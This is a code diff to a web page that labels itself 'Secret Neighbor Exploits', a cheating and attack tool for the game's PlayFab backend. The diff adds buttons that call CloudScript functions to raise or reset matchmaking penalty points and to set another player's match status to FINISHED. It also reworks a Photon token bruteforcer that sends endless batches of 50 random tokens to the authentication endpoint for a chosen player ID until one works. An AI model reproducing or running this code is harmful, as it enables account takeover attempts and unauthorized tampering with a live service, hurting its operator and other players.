@@ -158,6 +158,22 @@
     .renew-btn:hover {
       background-color: #0b7dda;
     }
+
+    .penalty-btn {
+      background-color: #f44336;
+    }
+
+    .penalty-btn:hover {
+      background-color: #d32f2f;
+    }
+
+    .reset-penalty-btn {
+      background-color: #2196F3;
+    }
+
+    .reset-penalty-btn:hover {
+      background-color: #1976D2;
+    }
   </style>
 </head>
 <body>
@@ -216,10 +232,10 @@
     </div>
 
     <div class="section">
-      <h2>🧑‍💻 Obtain Player ID With Username</h2>
+      <h2>🧑‍💻 Obtain PlayFab ID With Username</h2>
       <input id="steamUsername" placeholder="Steam Username" type="text">
-      <button onclick="getPlayFabId()">Obtain Player ID</button>
-      <div class="output" id="playerIdOutput">Player ID will appear here...</div>
+      <button onclick="getPlayFabId()">Obtain PlayFab ID</button>
+      <div class="output" id="playerIdOutput">PlayFab ID will appear here...</div>
     </div>
 
     <div class="section">
@@ -250,12 +266,12 @@
       </div>
       
       <div class="player-id-inputs">
-        <input id="playerId1" placeholder="Player ID 1" type="text">
-        <input id="playerId2" placeholder="Player ID 2" type="text">
-        <input id="playerId3" placeholder="Player ID 3" type="text">
-        <input id="playerId4" placeholder="Player ID 4" type="text">
-        <input id="playerId5" placeholder="Player ID 5" type="text">
-        <input id="playerId6" placeholder="Player ID 6" type="text">
+        <input id="playerId1" placeholder="PlayFab ID 1" type="text">
+        <input id="playerId2" placeholder="PlayFab ID 2" type="text">
+        <input id="playerId3" placeholder="PlayFab ID 3" type="text">
+        <input id="playerId4" placeholder="PlayFab ID 4" type="text">
+        <input id="playerId5" placeholder="PlayFab ID 5" type="text">
+        <input id="playerId6" placeholder="PlayFab ID 6" type="text">
       </div>
       
       <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
@@ -395,6 +411,17 @@
     </div>
 
     <div class="section">
+      <h2>⚖️ Penalty Points Management</h2>
+      <div class="grid-2">
+        <button class="penalty-btn" onclick="increasePenaltyPoints()">Increase Penalty Points</button>
+        <button class="reset-penalty-btn" onclick="decreasePenaltyPoints()">Decrease Penalty Points</button>
+      </div>
+      <input id="matchPlayerId" placeholder="Player ID for Match Status" type="text">
+      <button onclick="startMatchStatusSequence()">Decrease Penalty Points Fixed (wait 10 minutes)</button>
+      <div class="output" id="penaltyOutput">Penalty and match status results will appear here...</div>
+    </div>
+
+    <div class="section">
       <h2>🔑 Photon Token Generator <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
       <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
       <div class="output" id="photonTokenOutput">Token will appear here...</div>
@@ -415,7 +442,7 @@
 
     <div class="section">
       <h2>🔨 Photon Token Bruteforcer</h2>
-      <input id="playFabUsername" placeholder="PlayFab Username" type="text">
+      <input id="playFabUsername" placeholder="PlayFab ID" type="text">
       <button onclick="startBruteforce()">Start Bruteforce</button>
       <button onclick="stopBruteforce()">Stop Bruteforce</button>
       <div class="output" id="bruteforceOutput">Results will appear here...</div>
@@ -1073,6 +1100,142 @@
       }
     }
 
+    async function increasePenaltyPoints() {
+      const output = document.getElementById("penaltyOutput");
+      output.textContent = "Increasing penalty points...\n";
+      
+      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "increaseLowPriorityMatches",
+        FunctionParameter: {
+          reason: "LEAVE_MATCH"
+        },
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      if (data.error) {
+        output.textContent += `❌ Error: ${data.error}\n`;
+      } else {
+        output.textContent += `✅ Penalty points increased successfully\n`;
+        output.textContent += formatResponse(data.data);
+      }
+      output.scrollTop = output.scrollHeight;
+    }
+
+    async function decreasePenaltyPoints() {
+      const output = document.getElementById("penaltyOutput");
+      output.textContent = "Decreasing penalty points...\n";
+      
+      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "refreshStartPunishmentLevelTime",
+        FunctionParameter: null,
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "getXpMultiplier",
+        FunctionParameter: {
+          playerCount: 0
+        },
+        GeneratePlayStreamEvent: false,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "checkPopCornEvent",
+        FunctionParameter: null,
+        GeneratePlayStreamEvent: false,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `❌ Error: ${refreshData.error}` : "✅ Success"}\n`;
+      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `❌ Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
+      output.textContent += `checkPopCornEvent: ${popCornData.error ? `❌ Error: ${popCornData.error}` : "✅ Success"}\n`;
+      output.scrollTop = output.scrollHeight;
+    }
+
+    async function startMatchStatusSequence() {
+      const playerId = document.getElementById("matchPlayerId").value.trim();
+      const output = document.getElementById("penaltyOutput");
+      
+      if (!playerId) {
+        output.textContent = "Please enter a Player ID for match status.\n";
+        return;
+      }
+
+      output.textContent = "Starting match status sequence...\n";
+      
+      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "refreshStartPunishmentLevelTime",
+        FunctionParameter: null,
+        GeneratePlayStreamEvent: true,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "getXpMultiplier",
+        FunctionParameter: {
+          playerCount: 0
+        },
+        GeneratePlayStreamEvent: false,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+        CustomTags: null,
+        FunctionName: "checkPopCornEvent",
+        FunctionParameter: null,
+        GeneratePlayStreamEvent: false,
+        RevisionSelection: null,
+        SpecificRevision: null,
+        AuthenticationContext: null
+      });
+
+      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `❌ Error: ${refreshData.error}` : "✅ Success"}\n`;
+      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `❌ Error: ${xpMultiplierData.error}` : "✅ Success"}\n`;
+      output.textContent += `checkPopCornEvent: ${popCornData.error ? `❌ Error: ${popCornData.error}` : "✅ Success"}\n`;
+      output.textContent += "Waiting 10 minutes to update match status...\n";
+      output.scrollTop = output.scrollHeight;
+
+      setTimeout(async () => {
+        const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
+          CustomTags: null,
+          FunctionName: "changeMatchPlayerStatus",
+          FunctionParameter: {
+            playerId: playerId,
+            matchId: "",
+            newStatus: "FINISHED"
+          },
+          GeneratePlayStreamEvent: true,
+          RevisionSelection: null,
+          SpecificRevision: null,
+          AuthenticationContext: null
+        });
+
+        output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `❌ Error: ${matchData.error}` : "✅ Success"}\n`;
+        output.scrollTop = output.scrollHeight;
+      }, 10 * 60 * 1000);
+    }
+
     function toggleCoinFarmBot() {
       if (coinFarmBotRunning) {
         clearInterval(coinFarmIntervalId);
@@ -1329,90 +1492,83 @@
       }
     }
 
-     function generateRandomToken() {
-            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-            let token = '';
-            for (let i = 0; i < 50; i++) {
-                token += chars[Math.floor(Math.random() * chars.length)];
+    function generateRandomToken() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let token = '';
+      for (let i = 0; i < 50; i++) {
+        token += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return token;
+    }
+
+    async function checkToken(username, token) {
+      try {
+        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+        return { token, result: await res.json() };
+      } catch (error) {
+        return { token, error: error.message };
+      }
+    }
+
+    async function startBruteforce() {
+      if (bruteforceRunning) return;
+      const username = document.getElementById("playFabUsername").value.trim();
+      const output = document.getElementById("bruteforceOutput");
+      
+      if (!username) {
+        output.textContent = "Please enter a PlayFab ID.";
+        return;
+      }
+
+      bruteforceRunning = true;
+      output.textContent = "Starting bruteforce...\n";
+
+      async function tryTokenBatch() {
+        if (!bruteforceRunning) return;
+
+        const tokens = Array.from({ length: 50 }, () => generateRandomToken());
+        
+        const results = await Promise.all(
+          tokens.map(token => checkToken(username, token))
+        );
+
+        let foundValid = false;
+        for (const { token, result, error } of results) {
+          if (error) {
+            output.textContent += `Error for ${token}: ${error}\n`;
+          } else {
+            output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
+            if (result.resultCode === 1) {
+              output.textContent += `✅ Valid token found: ${token}\n`;
+              foundValid = true;
+              break;
             }
-            return token;
+          }
         }
 
-        // Function to check a token against the API
-        async function checkToken(username, token) {
-            try {
-                const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-                return { token, result: await res.json() };
-            } catch (error) {
-                return { token, error: error.message };
-            }
+        output.scrollTop = output.scrollHeight;
+
+        if (!foundValid && bruteforceRunning) {
+          setTimeout(tryTokenBatch, 0);
+        } else if (foundValid) {
+          stopBruteforce();
         }
+      }
 
-        // Function to start the bruteforce process
-        async function startBruteforce() {
-            if (bruteforceRunning) return;
-            const username = document.getElementById("playFabUsername").value.trim();
-            const output = document.getElementById("bruteforceOutput");
-            
-            if (!username) {
-                output.textContent = "Please enter a PlayFab Username.";
-                return;
-            }
+      tryTokenBatch();
+    }
 
-            bruteforceRunning = true;
-            output.textContent = "Starting bruteforce...\n";
-
-            // Recursive function to try batches of tokens
-            async function tryTokenBatch() {
-                if (!bruteforceRunning) return;
-
-                // Generate 50 tokens at once
-                const tokens = Array.from({ length: 50 }, () => generateRandomToken());
-                
-                // Check all tokens in parallel
-                const results = await Promise.all(
-                    tokens.map(token => checkToken(username, token))
-                );
-
-                let foundValid = false;
-                for (const { token, result, error } of results) {
-                    if (error) {
-                        output.textContent += `Error for ${token}: ${error}\n`;
-                    } else {
-                        output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
-                        if (result.resultCode === 1) {
-                            output.textContent += `✅ Valid token found: ${token}\n`;
-                            foundValid = true;
-                            break; // Stop the batch if a valid token is found
-                        }
-                    }
-                }
-
-                output.scrollTop = output.scrollHeight;
-
-                // If no valid token was found and bruteforce is still running, continue
-                if (!foundValid && bruteforceRunning) {
-                    setTimeout(tryTokenBatch, 0); // Use setTimeout to avoid stack overflow
-                } else if (foundValid) {
-                    stopBruteforce();
-                }
-            }
-
-            tryTokenBatch();
-        }
-
-        // Function to stop the bruteforce process
-        function stopBruteforce() {
-            bruteforceRunning = false;
-            const output = document.getElementById("bruteforceOutput");
-            output.textContent += "Bruteforce stopped.\n";
-            output.scrollTop = output.scrollHeight;
-        }
+    function stopBruteforce() {
+      bruteforceRunning = false;
+      const output = document.getElementById("bruteforceOutput");
+      output.textContent += "Bruteforce stopped.\n";
+      output.scrollTop = output.scrollHeight;
+    }
 
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
